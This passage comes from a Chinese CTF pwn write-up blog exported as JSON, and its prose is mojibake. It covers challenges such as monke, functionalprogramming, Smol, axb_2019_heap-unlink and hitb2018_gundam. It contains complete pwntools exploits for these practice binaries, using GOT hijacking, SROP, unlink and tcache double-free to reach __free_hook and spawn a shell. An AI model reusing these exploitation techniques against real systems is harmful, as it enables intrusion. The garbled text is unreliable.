0x{libc.address:x}\")\n```\n\n(2)åŠ«æŒfreeå‡½æ•°ä¸ºsystemå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#æ­¤æ—¶inventory[1].bananaçš„å€¼åº”è¯¥æ˜¯freeçš„gotè¡¨ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¿®æ”¹\n#inventory[1].banana.contentå°±ä¼šç›´æ¥ä¿®æ”¹freeçš„gotè¡¨ï¼Œä»è€ŒåŠ«æŒå‡½æ•°\nsh.sendline(\"1\")\nsh.recvline()\nsh.sendline(\"rename\")\nsh.recvline()\nsh.sendline(p64(libc.symbols[\"system\"]))\n```\n\n(3)å†ç”³è¯·ä¸€ä¸ªå†…å®¹ä¸º/bin/shå­—ç¬¦ä¸²çš„chunkï¼Œé‡Šæ”¾æ‰å³å¯getshellï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfind_banana(\"/bin/sh\", 10)\neat(2, True)\nsh.interactive()\n```\n\n(4)å‰ç½®å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nelf = ELF(\"./monke\")\nlibc = ELF(\"./libc-2.27.so\")\nsh = elf.process()\n#sh = remote(\"pwn.utctf.live\", 9999)\n\n\ndef skip_menu():\n    global sh\n    sh.recvuntil(\"2: inventory\\n\")\n    return bool(sh.recvline(timeout=0.5))\n\ndef walk(where=\"s\"):\n    global sh\n    sh.sendline(\"0\")\n    sh.sendlineafter(\"[n|s|e|w]\", where)\n    return skip_menu()\n\n\ndef find_banana(name, length):\n    global sh\n    while not walk():\n        pass\n    sh.sendline(\"3\")\n    sh.sendlineafter(\"How long would you like the name to be:\", str(length))\n    sh.sendlineafter(\"What would you like to name it:\", name)\n    skip_menu()\n\n\ndef eat(idx, end = False):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"eat\")\n    sh.recvline()\n    if not end:\n        skip_menu()\n\ndef rename(idx, name):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"rename\")\n    sh.recvline()\n    sh.sendline(name)\n    skip_menu()\n```\n\n \n\näºŒã€functionalprogrammingï¼š\n\n1.å¸¸è§„IDAï¼Œchecksecåˆ†æï¼ŒRELROæ²¡å¼€ã€‚ç¨‹åºæœ¬èº«å¾ˆç®€å•ï¼Œè¾“å…¥functionï¼Œparameterå’Œelementå¯ä»¥æ„é€ ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åè°ƒç”¨ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457785.png)\n\n2.ç„¶åç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ä¼šæ³„éœ²å‡ºlibcåœ°å€å’Œï¼Œç›´æ¥ä»ç½‘ç«™https://libc.blukat.me/æ¥æ‰¾ç‰ˆæœ¬ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–å·¥å…·ä¹Ÿå¯ä»¥ï¼Œåˆ©ç”¨æ³„éœ²å‡ºæ¥çš„abså‡½æ•°åœ°å€ï¼Œå³å¯å¾—çŸ¥libcç‰ˆæœ¬ä¸ºlibc6_2.23-0ubuntu11.2_amd64ã€‚\n\n3.ç„¶åæ ¹æ®ç¨‹åºï¼Œå³å¯æ„é€ system(\"/bin/sh\")ï¼Œæˆ–è€…åˆ©ç”¨onegadgetä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œç›´æ¥è´´expå§ã€‚\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\nio = remote('pwn.utctf.live',5433)\n#io = process('./functionalprogramming')\nonegadget = 0xf0364\n\nio.sendline('1')\nio.sendline('1')\nio.recvuntil(\"Abs: \")\nlibc_abs = int(io.recv()[2:14],16)\nlibc_base = libc_abs-0x3a640\nlog.info('libc_abs:%x'%libc_abs)\nlog.info('libc_base:%x'%libc_base)\nio.sendline('1')\n\n#io.sendline('1')\npayload = \"\"\npayload += hex(libc_base+onegadget)\npayload = payload.replace('0x','')\n\nio.send(payload)\nio.interactive()\n```\n\n \n\nä¸‰ã€Smolå¤ç°ï¼š\n\n1.æ²¡å•¥å¥½åˆ†æçš„ï¼Œæ ˆæº¢å‡ºæ¼æ´ï¼Œä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€ï¼Œå­˜åœ¨BSSæ®µï¼Œå¸¸è§„SROPï¼Œåˆ©ç”¨æ ˆåŠ«æŒåˆ°BSSæ®µï¼Œæ‡‚çš„éƒ½æ‡‚ã€‚\n\n2.ç›´æ¥è´´exp:\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\ncontext.update(os = 'linux', arch = 'amd64')\nio = remote(\"pwn.utctf.live\",9998)\n\npayload = \"\"\npayload += p64(0x402000+0x10)\npayload += p64(0x402000+0x10) #addr 0x402008\npayload += p64(0x401015) #rsp = 0x402020\nio.send(payload)\n\nframe_execve = SigreturnFrame() #è®¾ç½®execveçš„SROPå¸§ï¼Œæ³¨æ„è®¡ç®—/bin/sh\\x00æ‰€åœ¨åœ°å€\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = 0x402008\nframe_execve.rip = 0x40103D #syscall_addr\n\npayload2 = \"\"\npayload2 += \"/bin/sh\\x00\"        #0x402008\npayload2 += p64(0x402000+0x10)   #0x402010\npayload2 += p64(0x401015)        #0x402018\npayload2 += p64(0x402000+0x30)   #0x402020\npayload2 += \"A\"*0x10             #0x402028\npayload2 += p64(0x40103D)\npayload2 += str(frame_execve)    #0x402038\nio.send(payload2)\n\n#buf = 0x402008\n#rsp = 0x402020\n#rbp = 0x402010 ->0x402010\n\npayload3 = payload2[0:8]\npayload3 += \"\\x30\\x20\\x40\\x00\\x00\\x00\\x00\"\nio.send(payload3)\n\nio.interactive()\n```\n\nä½†æ˜¯è¿™é‡Œè°ƒè¯•äº†å¥½ä¸€æ®µæ—¶é—´ï¼Œéœ€è¦å†ä»”ç»†åˆ†æä¸€ç‚¹ï¼Œä¸‹å›äº‰å–æ—©ç‚¹è§£å†³ç±»ä¼¼çš„é¢˜ç›®ã€‚\n\n \n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"axb_2019_heap-unlink","url":"/2021/08/14/axb_2019_heap-unlink/","content":"\n1.æœ€å¼€å§‹çœ‹æºç ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œèƒ½çœ‹æ‡‚ï¼Œä½†æ˜¯ä¸€æ—¦çœ‹å…¶ä»–äººè®²unlinkï¼Œæ„Ÿè§‰å®Œå…¨å¯¹ä¸ä¸Šï¼Œåˆ†æ˜å°±æ˜¯çæï¼Œä¹‹åè°ƒè¯•æ‰å‘ç°å•ç‹¬çš„unlinkæ”»å‡»å¹¶ä¸æ˜¯é’ˆå¯¹chunkçš„ï¼Œè€Œæ˜¯é’ˆå¯¹å…·ä½“é¢˜ç›®çš„ç»“æ„ä½“çš„ã€‚å¹¶ä¸”è¦æ±‚ç¨‹åºå¯ä»¥ä¿®æ”¹æ‰chunkçš„sizeä½ï¼Œæ‰§è¡Œå‘ä¸Šåˆå¹¶ä»è€Œè§¦å‘unlinkã€‚\n\n2.unlinkæ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š\n\n(1)æ‰¾åˆ°é¢˜ç›®ä¸­çš„chunklistä½ç½®ï¼Œå¹¶åˆ†æ¸…ç»“æ„ä½“ä¸­æ˜¯sizeåœ¨å‰è¿˜æ˜¯chunkåœ¨å‰ã€‚\n\n(2)è¿™é‡Œå‡è®¾æˆ‘ä»¬æƒ³è¦æ§åˆ¶chunklist[0]ä¸­çš„chunkã€‚ç”³è¯·chunk0,chunk1,chunk2ã€‚åœ¨chunk0ä¸­æ„é€ fakechunkï¼Œå¹¶è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)é€šè¿‡å †æº¢å‡ºæˆ–è€…off-by-oneå°†chunk1çš„pre_sizeè®¾ç½®æˆfakechunk_sizeï¼Œå°†chunk1çš„sizeè®¾ç½®æˆfakechunk_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk1ï¼Œè¿™æ ·å°±ä¼šè§¦å‘å‘ä¸Šåˆå¹¶ï¼Œå°†fakechunkå’Œchunk1åˆå¹¶ã€‚åŒæ—¶ï¼Œç”±äºåˆå¹¶è¿‡ç¨‹ä¸­è°ƒç”¨äº†unlinkå‡½æ•°ï¼Œé‚£ä¹ˆchunklist[0].chunkå°±ä¼šæŒ‡å‘chunlist_addr-0x18ï¼Œå¯¹åº”çš„å°±æ˜¯æˆ‘ä»¬çš„chunk0æŒ‡å‘chunklist_addr-0x18ã€‚\n\nâ–²unlinkæºç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\nmalloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\nFD->bk = BK;\nBK->fd = FD;\n```\n\nA.é¦–å…ˆé€šè¿‡fakechunkï¼Œä¹Ÿå°±æ˜¯pï¼Œæ‰¾åˆ°å‰ä¸€ä¸ªchunkå’Œåä¸€ä¸ªchunk:\n\n```\n#æ³¨é‡Šå¤´\n\nFD = P->fd;\nBK = P->bk;\n```\n\nè¿™é‡Œçš„FDå’ŒBKåˆ†åˆ«ä¸ºfakechunkçš„å‰ä¸€ä¸ªchunkå’Œåä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯chunklist_addr-0x18å’Œchunklist_addr-0x10ã€‚\n\nB.ç„¶åè¿‡æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\nèƒ½è¿‡æ£€æŸ¥çš„åŸå› å°±æ˜¯å› ä¸ºFD->bkå°±ç›¸å½“äºæ˜¯[chunklist_addr-0x18]+[0x18]ï¼Œå°±ç›¸å½“äºchunklist_addrï¼Œä¹Ÿå°±æ˜¯chunklist[0].chunkã€‚è€Œè¯¥åœ°å€ä¸­ä¿å­˜çš„å†…å®¹å°±æ˜¯fakechunk_addrã€‚\n\næ³¨æ„chunk0_addrå’Œfakechunk_addrä¸æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºæœ‰chunkç»“æ„çš„åŸå› ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°å®é™…ä¸Šchunklist[n].chunkä¿å­˜çš„å€¼æ˜¯chunkæ•°æ®éƒ¨åˆ†çš„åœ°å€ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±ç›¸å½“äºæ˜¯fakechunk_addrã€‚æ‰€ä»¥ä¹Ÿå°±èƒ½è¿‡æ£€æŸ¥ã€‚åŒç†BK->fdç›¸å½“äºæ˜¯[chunklist_addr-0x10]+[0x10]ï¼Œç­‰äºchunklist_addrï¼Œè¯¥åœ°å€ä¸­ä¿å­˜çš„å€¼å°±æ˜¯fakechunk_addrã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533541.jpeg)\n\nC.è¿‡å®Œæ£€æŸ¥ä¹‹åï¼Œå°±æ¥åˆ°èµ‹å€¼éƒ¨åˆ†\n\n```\n#æ³¨é‡Šå¤´\n\nFD->bk = BK;\nBK->fd = FD;\n```\n\né‚£ä¹ˆç°åœ¨FD->bk = BKç›¸å½“äº[chunklist_addr-0x18]+[0x18]ï¼Œä¹Ÿå°±æ˜¯chunklist_addrä¸­çš„å€¼è¢«èµ‹å€¼ä¸ºchunklist_addr-0x10ï¼Œä¹‹åBK->fd = FDï¼Œå°±æ˜¯chunklist_addrä¸­çš„å€¼è¢«èµ‹å€¼ä¸ºchunklist_addr-0x18ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œchunklist[0].chunkä¼šæŒ‡å‘chunklist_addr-0x18ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„fakechunkæŒ‡å‘chunklist_addr-0x18ï¼Œè¿™æ ·å°±ç›¸å½“äºå¯ä»¥é€šè¿‡ä¿®æ”¹fakechunkå°±å¯ä»¥ä¿®æ”¹chunklistè¿™ä¸ªbssæ®µä¸Šçš„å†…å®¹ã€‚è€Œfakechunkåˆæ˜¯chunk0çš„æ•°æ®éƒ¨åˆ†ï¼Œå®Œå…¨åœ¨æˆ‘ä»¬çš„æŒæ§èŒƒå›´ã€‚\n\n(5)ç°åœ¨ä¿®æ”¹chunk0æ•°æ®å°±å…ˆå½“äºä¿®æ”¹chunklistè¿™ä¸ªbssæ®µä¸Šçš„å†…å®¹ã€‚\n\n3.åœ¨è¿™é“é¢˜ä¸­ï¼ŒåŸæœ¬chunklist[0].chunkä¸­ä¿å­˜çš„å€¼æ˜¯fakechunk_addrï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹chunklist[0].chunkä¸­ä¿å­˜çš„å€¼ä¸ºfree_hookåœ°å€ï¼Œé‚£ä¹ˆä¹‹åå†ä¿®æ”¹chunk0æ•°æ®éƒ¨åˆ†å°±ç›¸å½“äºä¿®æ”¹free_hookä¸­çš„å†…å®¹äº†ã€‚é‚£ä¹ˆç°åœ¨å°±å¯ä»¥å°†free_hookä¿å­˜çš„å€¼ä¿®æ”¹ä¸ºsystemçš„çœŸå®åœ°å€ï¼Œè¿™æ ·åœ¨freeæ—¶å°±ç›¸å½“äºè°ƒç”¨systemå‡½æ•°ï¼Œé‚£ä¹ˆä¸€æ—¦freeæŸä¸ªchunkï¼Œè€Œè¯¥chunkçš„æ•°æ®éƒ¨åˆ†ä¸ºbinshå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºè°ƒç”¨system(\"/bin/sh\")ï¼Œä»è€Œgetshell.\n\n4.ç°åœ¨å¼€å§‹åˆ†æè¿™é“é¢˜ç›®ï¼Œget_inputå‡½æ•°ä¸­å­˜åœ¨off-by-oneï¼Œbanner()å‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\nget_input:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533283.jpeg)\n\nbanner:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533339.jpeg)\n\nåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´æ³„éœ²Libcä»è€Œå¾—åˆ°å…¶å®ƒæ‰€æœ‰åœ°å€ã€‚ä¹‹åé€šè¿‡off-by-oneè¿›è¡Œunlinkæ”»å‡»ï¼Œæ„é€ fakechunkåˆ°chunklistè¿™ä¸ªBssæ®µä¸Šï¼Œä¿®æ”¹chunklistæ®µä¸Šçš„chunklist[0].chunkï¼Œä½¿å…¶æŒ‡å‘free_hook_addrã€‚ä¹‹åå†é€šè¿‡ä¿®æ”¹chunk0ä»è€Œä¿®æ”¹free_hookä¸ºsystemçœŸå®åœ°å€ï¼Œå†ç”³è¯·æŸä¸ªæ•°æ®éƒ¨åˆ†ä¸ºbinshå­—ç¬¦ä¸²çš„chunkï¼Œé‡Šæ”¾æ‰å°±èƒ½getshellã€‚\n\næ€»expå¦‚ä¸‹ï¼š\n\n(1)é¦–å…ˆå¢åˆ æ”¹æŸ¥å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef add(index,size,content):\n    p.sendlineafter('>> ','1')\n    p.sendlineafter('Enter the index you want to create (0-10):',str(index))\n    p.sendlineafter('Enter a size:',str(size))\n    p.sendlineafter('Enter the content:',content)\n\ndef free(index):\n    p.sendlineafter('>> ','2')\n    p.sendlineafter('Enter an index:',str(index))\n\ndef edit(index,content):\n    p.sendlineafter('>> ','4')\n    p.sendlineafter('Enter an index:',str(index))\n    p.sendafter('Enter the content:',content)\n```\n\n(2)åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´æ³„éœ²æ ˆä¸Šçš„__libc_mainå’Œmainåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\np.sendline('%11$p%15$p')\np.recvuntil('Hello,')\nbase = hex(int(p.recv(14),16)-0x116a - 28)\nlibcbase = hex(int(p.recv(14),16) - 240 - libc.sym['__libc_start_main'])\nchunklist = hex(base + 0x202060)\nfree_hook = libcbase + libc.sym['__free_hook']\nsystem = libcbase + libc.sym['system']\n```\n\n(3)åˆ©ç”¨off-by-oneå‘ä¸Šåˆå¹¶chunk0å’Œchunk1ï¼Œæ‰§è¡Œunlinkæ”»å‡»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0,0x98,'aaaa')#0\nadd(1,0x98,'bbbb')#1\nadd(2,0x90,'cccc')#2\nadd(3,0x90,'/bin/sh\\x00')#3\n\npayload=p64(0)+p64(0x91)+p64(chunklist-0x18)+p64(chunklist-0x10)+p64(0)*14+p64(0x90)+'\\xa0'\nedit(0,payload)\ndelete(1)\n```\n\n(4)ä¿®æ”¹chunklist[0].chunkæŒ‡å‘free_hookï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nedit(0,p64(0)*3+p64(free_hook)+p64(0x10))\n#ç”±äºunlinkæ”»å‡»èµ‹å€¼ä¹‹åï¼Œchunk0æ•°æ®éƒ¨åˆ†æŒ‡å‘äº†chunklist_addr-0x18ä½ç½®ï¼Œæ‰€ä»¥éœ€è¦å¡«å……p64(0)*3\n```\n\n(5)ä¿®æ”¹free_hookä¸ºsystemï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nedit(0,p64(system))\n```\n\n(6)åˆ©ç”¨freeè§¦å‘systemï¼Œgetshell\n\n```\n#æ³¨é‡Šå¤´\n\nfree(3)\np.interactive()\n```\n\n \n\n \n\n \n\n \n","tags":["unlink"],"categories":["PWN","pwnå †-unlink"]},{"title":"hitb2018_gundam","url":"/2021/08/14/hitb2018_gundam/","content":"\n1.å¸¸è§„checksecï¼Œä¿æŠ¤å…¨å¼€ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œåœ¨åˆ é™¤å‡½æ•°sub_D32()ä¸­å­˜åœ¨Double freeå’ŒUAFæ¼æ´ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515866.jpeg)\n\né€šè¿‡é€†å‘åˆ†æï¼Œç»“æ„ä½“é‡æ•´åŒ–ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct gundam\n{\nint flag;\nchar *name;\nchar type[24];\n}gundam;\n\nstruct gundam* factory[9]\n```\n\nä¹‹åå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515821.jpeg)\n\n(1)Double free:å¯ä»¥çœ‹åˆ°åœ¨åˆ é™¤å‡½æ•°ä¸­ï¼Œç¨‹åºé€šè¿‡factory[idx]å’Œcountæ¥åˆ¤æ–­gundamæ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”åªæ˜¯freeæ‰äº†factory[idx]->nameè¿™ä¸ªchunkï¼Œå¹¶ä¸”å°†flagç½®ç©ºï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å°†factory[idx]è¿™ä¸ªæŒ‡é’ˆç½®ç©ºã€‚è€Œä¸”è¿™æ˜¯åœ¨Tcacheæœºåˆ¶ä¸‹ï¼Œæ²¡æœ‰å¯¹Double freeçš„æ£€æŸ¥ï¼Œé‚£ä¹ˆå°±ä»£è¡¨å¦‚æœå…¶å®æˆ‘ä»¬æ˜¯å¯ä»¥è¿ç»­å¤šæ¬¡freeæ‰factory[idx]->nameè¿™ä¸ªchunkçš„ã€‚\n\n(2)UAF:å¦å¤–factory[idx]->nameè¿™ä¸ªæŒ‡é’ˆä¹Ÿæ²¡æœ‰ç½®ç©ºï¼Œå¯ä»¥é€šè¿‡factory[idx]å†æ¬¡åˆ©ç”¨ï¼Œå½¢æˆUAFæ¼æ´ã€‚\n\n2.æ€è€ƒåˆ©ç”¨æ–¹å¼:ç”±äºlibcç‰ˆæœ¬æ˜¯2.26ï¼Œä»unsortedbinsä¸­ç”³è¯·å›çš„chunkå¦‚æœä¸è¢«ç¨‹åºæ›´æ”¹å†…å®¹ï¼Œå…¶fdå’Œbkä»ç„¶ä¿å­˜ï¼Œå¯ä»¥æ³„éœ²åœ°å€ã€‚ç”±äºbuildçš„æ—¶å€™ï¼Œæ²¡æœ‰å°†nameè¿™ä¸ªchunkçš„å†…å®¹åˆå§‹åŒ–ä¸º0ï¼Œæ‰€ä»¥è¯¥chunkå¦‚æœè¿›å…¥unsortedbinä¸­ä¹‹åï¼Œfdè¢«èµ‹å€¼ä¸ºmain_arena+88ï¼Œé‚£ä¹ˆç”³è¯·å›æ¥ä¹‹åï¼Œnameä¸­çš„bkå°±å¸¦æœ‰main_arena+88çš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡visitæ‰“å°å‡ºæ¥ï¼Œä»è€Œè®¡ç®—å¾—åˆ°ï¼Œæ³„éœ²libcåŸºåœ°å€ã€‚\n\n(1)é‚£ä¹ˆå…ˆå¡«æ»¡tcacheä¹‹åï¼Œå†åŠ ä¸ªchunkï¼Œä½¿å…¶è¿›å…¥unsorted binä¸­ï¼Œç„¶åç”³è¯·å›æ¥å°±å¯ä»¥å¾—åˆ°libcåœ°å€äº†ã€‚\n\n(2)å¾—åˆ°libcåœ°å€åï¼Œç”±äºlibcç‰ˆæœ¬æ˜¯2.26ï¼Œä»ç„¶å­˜åœ¨tcache poisoningæ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡Double freeæ¼æ´è¿›è¡Œç±»ä¼¼fastbins attackæ”»å‡»ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nå‡å¦‚ç”³è¯·chunk0,chunk1ï¼Œç„¶åè¿ç»­free(chunk0)ä¸¤æ¬¡ï¼Œè¿™æ ·tcache binä¸­å°±æ˜¯ï¼š\nchunk0.fd ->chunk0ï¼Œå³chunk0->chunk0\né‚£ä¹ˆç¬¬ä¸€æ¬¡ç”³è¯·å›chunk0ï¼Œä¿®æ”¹fdä¸ºfakechunkï¼Œtcache binä¸­å°±æ˜¯ï¼š\nchunk0.fd->fakechunkï¼Œå³chunk0->fakechunk\nä¹‹åå†ç”³è¯·å›chunk0ï¼Œå†ç”³è¯·ä¸€æ¬¡å°±æ˜¯fakechunkäº†ï¼Œå®ç°ä»»æ„åœ°å€ä¿®æ”¹ã€‚\nâ˜…è¿™ä¸ªæ¼æ´åœ¨libc2.27åŠä¹‹åå°±è¢«ä¿®å¤äº†ï¼Œå³ä¸èƒ½è¿ç»­free(chunk0)ä¸¤æ¬¡ï¼Œå¦åˆ™ç¨‹åºç›´æ¥å´©æºƒã€‚\n```\n\nâ‘ å…ˆç”³è¯·ä¸‰ä¸ªchunkï¼Œchunk0,chunk1,chunk2ï¼Œchunk1å­˜æ”¾binshå­—ç¬¦ä¸²ï¼Œchunk2ç”¨æ¥é˜²æ­¢è¢«topchunkåå¹¶ã€‚ä¹‹åé‡Šæ”¾chunk0ä¸¤æ¬¡ï¼Œé‚£ä¹ˆtcacheä¸­çš„chunk0çš„fdæŒ‡é’ˆå°±ä¼šæŒ‡å‘è‡ªå·±ï¼Œå½¢æˆï¼šchunk0->chunk0ã€‚\n\nâ‘¡ä¹‹åå†ç”³è¯·ä¸€ä¸ªchunkï¼Œå¯¹åº”ç´¢å¼•ä¸º0ï¼Œç”³è¯·å›ç¬¬ä¸€ä¸ªchunk0ï¼Œä¿®æ”¹nameå†…å®¹__free_hook_addrï¼Œè€Œnameå†…å®¹çš„å‰å…«ä¸ªå­—èŠ‚å°±æ˜¯chunk0çš„fdï¼Œå³tcachebinä¸­å°±ä¼šç”±ä¹‹å‰çš„chunk0->chunk0å˜ä¸ºchunk0->__free_hook_addr\n\nâ‘¢å†è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œå¯¹åº”ç´¢å¼•ä¸º3,4ï¼Œchunk4çš„å¤´åœ°å€å°±ä¼šæ˜¯__free_hook_addr-0x10ï¼Œé‚£ä¹ˆä¿®æ”¹chunk4çš„nameä¸­çš„å‰å…«ä¸ªå­—èŠ‚å°±ç›¸å½“äºä¿®æ”¹_free_hookï¼Œè¿™é‡Œä½¿å…¶å˜ä¸ºsystemçš„çœŸå®åœ°å€ï¼Œå†free(chunk_binsh)å³å¯getshellã€‚\n\n3.ç¼–å†™exp:\n\n(1)å‰ç½®å¢åˆ æ”¹æŸ¥å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef build(name):\n    io.sendlineafter(' :', \"1\")\n    io.sendafter(' :', name)\n    io.sendlineafter(' :', \"1\")\n\ndef visit():\n    io.sendlineafter(' :', \"2\")\n\ndef destory(idx):\n    io.sendlineafter(' :', \"3\")\n    io.sendlineafter(\":\", str(idx))\n\ndef blow():\n    io.sendlineafter(' :', \"4\")\n```\n\n(2)æ³„éœ²åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#åˆ›å»º9ä¸ªchunk,å†åˆ é™¤9ä¸ªchunk,7ä¸ªè¿›å…¥tcache,1ä¸ªè¿›å…¥unsortedbin,1ä¸ªè¿›å…¥topchunk,è¿™é‡Œç”±äºæœ‰ä¸ª0x28çš„gundam_chunkåœ¨ï¼Œæ‰€ä»¥ä¸ä¼šå…¨éƒ¨éƒ½è¿›å…¥topchunk\nfor i in xrange(9):\n    build(\"AAAA\")\nfor i in xrange(9):\n    destory(i)\nblow()\n#ä¸ºäº†æ¸…ç©ºcount\n\n#æ¸…ç©ºtcachebinä¹‹åå†ç”³è¯·ä¸€ä¸ªchunkå°±æ˜¯unsortedbinä¸­çš„\nfor i in xrange(7):\n    build('BBBBBBBB')\nbuild('CCCCCCCC')\n\n#leak:\nvisit()\nmain_arena = 0x3dac20\nlibc.address = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 88 - main_arena\nsuccess(\"libc -> {:#x}\".format(libc.address))\n```\n\n(3)æ¸…ç©ºcountï¼Œæ–¹ä¾¿è®¡ç®—ç´¢å¼•:\n\n```\n#æ³¨é‡Šå¤´\n\nfor i in xrange(8):\n    destory(i)\nblow()\n```\n\n(4)åˆ©ç”¨tcache poisoningå’Œdouble freeæ¼æ´ï¼Œgetshell:\n\n```\n#æ³¨é‡Šå¤´\n\nbuild(\"0000\")\nbuild(\"/bin/sh\\0\")\nbuild(\"2222\")\ndestory(0)\ndestory(0)\nbuild(p64(libc.sym['__free_hook']))\nbuild(\"/bin/sh\\0\")\nbuild(p64(libc.sym['system']))\ndestory(1)#1æˆ–è€…3éƒ½å¯ä»¥\n\nio.interactive()\n```\n\n \n\nâ–²è¿™ä¸ªæ³„éœ²åœ°å€çš„æ¼æ´åœ¨æ²¡æœ‰tcacheæœºåˆ¶çš„libcç‰ˆæœ¬ä¸­éƒ½å¯ä»¥ç”¨ï¼Œä½†æ˜¯tcache poisoningåªæœ‰libc2.26æ‰å¯ä»¥ç”¨\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nctf-all-in-one\n\n \n","tags":["Tcache"],"categories":["PWN","pwnå †-Tcache"]},{"title":"bugs bunny ctf 2017-pwn150","url":"/2021/08/14/bugs bunny ctf 2017-pwn150/","content":"\n \n\n1.å¸¸è§„checksecï¼Œå¯ä»¥å‘ç°NX enabledï¼Œå¹¶ä¸”æ²¡æœ‰RAXå­—æ®µã€‚æ‰“å¼€IDAåå¯ä»¥çœ‹åˆ°åœ¨helloå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar s; // [rsp+0h] [rbp-50h]\n---------------------------------------------------------------\nfgets(&s, 192, stdin);\n```\n\nç„¶ååˆ†æç¨‹åºï¼Œæ±‡ç¼–ä»£ç ä»€ä¹ˆçš„ï¼Œæ²¡æ‰¾åˆ°æœ‰call eaxä¹‹ç±»çš„æ“ä½œï¼Œè¿™é‡Œå°±é€‰æ‹©ROPæ¥getshellã€‚\n\n2.ç”±äºæ˜¯64ä½ç¨‹åºï¼Œä¼ å‚æ–¹å¼ä¸åŒï¼Œä¾æ¬¡ä¸ºï¼šrdi, rsi, rdx, rcx, r8, r9, æ ˆï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·³è½¬systemå‡½æ•°ï¼Œè®©systemå‡½æ•°è¯»å–binshå­—ç¬¦ä¸²ï¼Œsystemå‡½æ•°åˆåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‚æ•°å¿…ç„¶éœ€è¦åœ¨rdiä¸­è¯»å–ã€‚æˆ‘ä»¬çš„è¾“å…¥æ˜¯ä½äºæ ˆä¸Šï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªpop rdi;å’Œretçš„æ“ä½œå‘½ä»¤ï¼Œè®©æˆ‘ä»¬çš„è¾“å…¥èµ‹å€¼ç»™rdiå¯„å­˜å™¨ã€‚\n\n3.åœ¨å“ªæ‰¾pop rdi; ret;ä¹Ÿæ˜¯ä¸ªé—®é¢˜ï¼Œè¿™é‡Œæœ‰ä¸ªå·¥å…·å¯ä»¥å®ç°ROPgadget ï¼Œåœ¨linuxä¸‹å¯ä»¥è¾“å…¥ï¼šä»¥ä¸‹ä»£ç æ¥è·å–ä»£ç åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nROPgadget --binary pwn150 | grep 